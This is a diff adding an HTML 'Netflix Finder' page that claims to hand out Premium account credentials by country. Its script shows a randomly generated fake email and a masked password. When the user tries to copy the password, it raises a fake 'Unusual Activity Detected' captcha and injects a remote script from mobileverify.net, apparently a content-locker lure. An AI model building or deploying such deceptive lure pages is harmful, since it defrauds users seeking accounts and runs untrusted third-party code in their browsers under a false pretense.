@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix Finder - Enhanced Design</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+  body, html {
+    height: 100%;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Roboto', sans-serif;
+    background-color: #141414;
+    color: #FFFFFF;
+    font-size: 14px;
+  }
+
+  .container {
+    width: 90%;
+    max-width: 480px;
+    text-align: center;
+  }
+
+  .logo-container {
+    margin-bottom: 10px;
+  }
+
+  .logo-image {
+    max-width: 70%;
+    height: auto;
+  }
+
+  .separator {
+    height: 2px;
+    background: #E50914;
+    margin: 5px 0 10px;
+    width: 80%;
+  }
+
+  .country-buttons {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 5px;
+    margin: 10px 0;
+  }
+
+  .country-buttons button {
+    flex: 1 1 90px;
+    background-color: transparent;
+    border: 1px solid #E50914;
+    color: #FFF;
+    padding: 5px 8px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-size: 14px;
+  }
+
+  .country-buttons button.selected {
+    background-color: #E50914;
+  }
+
+  #findButton {
+    width: 100%;
+    padding: 8px;
+    background-color: #E50914;
+    border: none;
+    color: white;
+    cursor: pointer;
+    margin-bottom: 10px;
+    font-size: 14px;
+  }
+
+  .result {
+    display: none;
+    animation: fadeIn 0.5s;
+    text-align: left;
+    border: 1px solid #E50914;
+    border-radius: 8px;
+    padding: 10px;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+
+  .result h3 {
+    color: #E50914;
+  }
+
+  .result-info {
+    margin-bottom: 5px;
+  }
+
+  .copy-btn {
+    background-color: #E50914;
+    color: #FFF;
+    border: none;
+    padding: 4px 8px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 12px;
+    transition: background-color 2s ease-in-out;
+  }
+
+  .rolling-animation {
+    animation: smoothRoll 2s infinite linear;
+    display: inline-block;
+    font-size: 20px; 
+    font-weight: bold; 
+  }
+
+  @keyframes smoothRoll {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+
+  .captcha-container {
+    display: none;
+    margin-top: 20px;
+    text-align: center;
+    border: 2px solid #E50914;
+    padding: 10px;
+    border-radius: 5px;
+  }
+
+  .captcha-title {
+    color: #FFFFFF;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  @media (max-width: 480px) {
+    .country-buttons {
+      flex-direction: column;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo-container">
+    <img src="logoweb.png" alt="Logo" class="logo-image">
+    <center><div class="separator"></div></center>
+    <h4>Select Account Country:</h4>
+  </div>
+  <div class="country-buttons" id="countryButtons">
+    <button data-country="US">United States</button>
+    <button data-country="UK">United Kingdom</button>
+    <button data-country="CA">Canada</button>
+    <button data-country="Other">Other Countries</button>
+  </div>
+  <button id="findButton">Find</button>
+  <div class="result" id="result">
+    <!-- Enhanced Result will be populated here -->
+  </div>
+</div>
+<br><div class="footer">
+  © OniStream - All rights reserved.
+</div>
+<script>
+  const countryButtons = document.getElementById("countryButtons");
+  const result = document.getElementById("result");
+  let selectedCountry = "";
+
+  countryButtons.addEventListener("click", function(e) {
+    if (e.target.tagName === 'BUTTON') {
+      Array.from(this.children).forEach(btn => btn.classList.remove('selected'));
+      e.target.classList.add('selected');
+      selectedCountry = e.target.getAttribute("data-country");
+    }
+  });
+
+  document.getElementById("findButton").addEventListener("click", function() {
+    result.innerHTML = `<p>Searching...</p>`;
+    result.style.display = "block";
+    
+    setTimeout(() => {
+      const email = `user${Math.floor(Math.random() * 10000)}@example.com`;
+      const password = `Secr3t!${Math.floor(Math.random() * 10000)}`;
+
+      result.innerHTML = `
+        <h3>Account Details</h3>
+        <div class="result-info"><b>Email:</b> <span>${email}</span> 
+          <button class="copy-btn" onclick="copyToClipboard(this, '${email}')">Copy</button>
+        </div>
+        <div class="result-info"><b>Password:</b>
+          <span>********</span> <!-- For demonstration -->
+          <button class="copy-btn" id="copyPassword">Copy</button>
+        </div>
+        <div class="captcha-container" id="captchaContainer">
+          <p class="captcha-title">Solve the captcha to copy the password:</p>
+         <center> <div class="rolling-animation" style="font-size:18px;display:none;" id="captchaLoader">&#10227;</div></center>
+          <!-- Updated to immediately show the captcha container -->
+        </div>
+        <p>
+          <strong>Plan:</strong> Premium<br>
+          <strong>Features:</strong> Unlimited movies, TV shows, and more.<br>
+          Watch on 4 devices simultaneously.<br>
+          Ultra HD available.
+        </p>
+      `;
+
+      const copyPasswordButton = document.getElementById("copyPassword");
+      copyPasswordButton.addEventListener("click", function() {
+        this.innerHTML = '<div class="rolling-animation">&#10227;</div>';
+        this.style.padding = '4px 8px';
+        
+        setTimeout(() => {
+          this.innerHTML = 'Unusual Activity Detected!';
+          this.style.padding = '4px 8px'; // Ensure button size doesn't change
+          const captchaContainer = document.querySelector('.captcha-container');
+          const captchaLoader = document.getElementById("captchaLoader");
+          captchaContainer.style.display = 'block';
+          captchaLoader.style.display = 'inline-block'; // Show loader
+
+          setTimeout(() => {
+            captchaLoader.style.display = 'none'; // Hide loader
+            captchaContainer.innerHTML += '<div data-captcha-enable="true"></div>';
+            const scriptTag = document.createElement('script');
+            scriptTag.type = 'text/javascript';
+            scriptTag.src = 'https://mobileverify.net/cp/js/j342y';
+            document.body.appendChild(scriptTag);
+          }, 2000); // 2 seconds to show the actual captcha after loader
+        }, 2000);
+      });
+
+    }, 3000); // Simulate a search delay
+  });
+
+  function copyToClipboard(button, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      button.textContent = 'Copied!';
+      setTimeout(() => {
+        button.textContent = 'Copy';
+      }, 2000);
+    }, (err) => {
+      console.error('Could not copy text: ', err);
+    });
+  }
+</script>
+</body>
+</html>
